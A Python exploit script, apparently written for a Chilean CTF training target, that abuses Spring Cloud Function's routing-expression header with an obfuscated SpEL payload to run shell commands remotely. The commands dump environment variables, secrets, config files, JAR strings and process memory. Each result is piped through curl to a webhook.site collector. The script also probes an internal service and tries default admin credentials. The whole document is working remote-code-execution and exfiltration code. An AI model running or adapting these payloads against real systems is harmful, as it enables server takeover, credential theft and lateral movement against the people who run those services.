#!/usr/bin/env python3
"""
CTF Chile - Búsqueda FINAL súper específica
Los lugares MÁS obvios donde están las flags en CTFs
"""
import requests
import time

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

print("[🎯] BÚSQUEDA FINAL - Lugares obvios de flags")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    URL: https://webhook.site/#!/{UUID}")
print()

def build_payload(cmd):
    esc = cmd.replace("\\", "\\\\").replace('"', '\\"')
    return (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + esc + '"}'
        ').waitFor()'
    )

def exec_cmd(tag, cmd):
    payload = build_payload(cmd)
    try:
        requests.post(
            ROUTER,
            headers={
                "spring.cloud.function.routing-expression": payload,
                "Content-Type": "text/plain",
            },
            data="x",
            timeout=15,
        )
        print(f"    ✓ {tag}")
    except Exception as e:
        print(f"    ✗ {tag}: {e}")

# === TOP 10 LUGARES OBVIOS PARA FLAGS ===
print("🔍 Ejecutando búsquedas dirigidas...")

# 1. Variables de entorno COMPLETAS
exec_cmd("env_completo", f"env | curl -s -X POST --data-binary @- {WH}/env_all")

# 2. Variable específica FLAG
exec_cmd("var_flag", f"echo $FLAG | curl -s -X POST --data-binary @- {WH}/var_flag")

# 3. Todas las variables que contengan flag/ctf
exec_cmd("env_grep", f"env | grep -iE '(flag|ctf|secret|token|key|password)' | curl -s -X POST --data-binary @- {WH}/env_grep")

# 4. Archivo flag.txt en todos lados
exec_cmd("flag_find", f"find / -name '*flag*' 2>/dev/null | head -20 | xargs cat 2>/dev/null | curl -s -X POST --data-binary @- {WH}/flag_find")

# 5. Spring Boot actuator endpoints
exec_cmd("actuator_env", f"curl -s http://localhost:8080/actuator/env 2>/dev/null | curl -s -X POST --data-binary @- {WH}/actuator_env")
exec_cmd("actuator_info", f"curl -s http://localhost:8080/actuator/info 2>/dev/null | curl -s -X POST --data-binary @- {WH}/actuator_info")

# 6. application.properties específico
exec_cmd("app_properties", f"cat /app/application*.properties /app/config/application*.properties 2>/dev/null | curl -s -X POST --data-binary @- {WH}/app_properties")

# 7. JAR específico por flags
exec_cmd("jar_flag_search", f"unzip -p /app/app.jar | strings | grep -iE '(ctf\\{{|flag\\{{|FLAG\\{{)' | curl -s -X POST --data-binary @- {WH}/jar_flags")

# 8. Directorio actual y archivos
exec_cmd("pwd_ls", f"pwd && ls -la | curl -s -X POST --data-binary @- {WH}/pwd_ls")

# 9. Todos los archivos en /app
exec_cmd("app_all_files", f"find /app -type f 2>/dev/null | head -50 | curl -s -X POST --data-binary @- {WH}/app_files")

# 10. Servicio interno OmniVault - endpoints reales
exec_cmd("vault_root", f"curl -s http://10.160.209.2:8080/ | curl -s -X POST --data-binary @- {WH}/vault_root")
exec_cmd("vault_api_info", f"curl -s http://10.160.209.2:8080/api/info 2>/dev/null | curl -s -X POST --data-binary @- {WH}/vault_api_info")

# 11. Login real con creds típicas y ver respuesta completa
exec_cmd("vault_login_real", f"curl -s -X POST -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"password\"}}' http://10.160.209.2:8080/api/login | curl -s -X POST --data-binary @- {WH}/vault_login_real")

# 12. Buscar en memoria del proceso Java
exec_cmd("java_memory", f"ps aux | grep java | awk '{{print $2}}' | head -1 | xargs -I PID cat /proc/PID/environ 2>/dev/null | tr '\\0' '\\n' | grep -iE '(flag|ctf)' | curl -s -X POST --data-binary @- {WH}/java_mem")

print()
print("⏳ Esperando 15s para que lleguen las respuestas...")
time.sleep(15)

print(f"\n🌐 REVISA RESULTADOS: https://webhook.site/#!/{UUID}")
print()
print("📋 QUÉ BUSCAR:")
print("   • env_all: Variables de entorno completas")
print("   • env_grep: Variables que contengan flag/ctf/secret")
print("   • flag_find: Archivos con 'flag' en el nombre")
print("   • actuator_*: Endpoints de Spring Boot")
print("   • jar_flags: Strings con CTF{ del JAR")
print("   • vault_*: Respuestas del servicio OmniVault")
print()
print("🎯 FORMATO TÍPICO: CTF{algo_aqui}")
print("💡 Si no hay flags aquí, están en los servicios internos que requieren autenticación")